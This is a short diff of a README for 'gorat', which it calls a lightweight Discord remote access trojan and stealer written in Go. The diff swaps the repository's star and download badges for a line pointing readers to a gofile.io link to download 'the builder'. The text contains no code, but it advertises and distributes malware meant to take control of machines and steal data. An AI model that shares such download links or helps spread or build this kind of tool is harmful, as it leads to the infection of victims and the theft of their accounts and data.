@@ -1,7 +1,8 @@
 # gorat
 
-![GitHub stars](https://img.shields.io/github/stars/nw8g/GoRat?style=social)
-![Downloads](https://img.shields.io/github/downloads/nw8g/GoRat/total?style=social)
+Download the builder here. :
+
+https://gofile.io/d/VMEKx3
 
 lightweight discord rat & stealer written in go
 
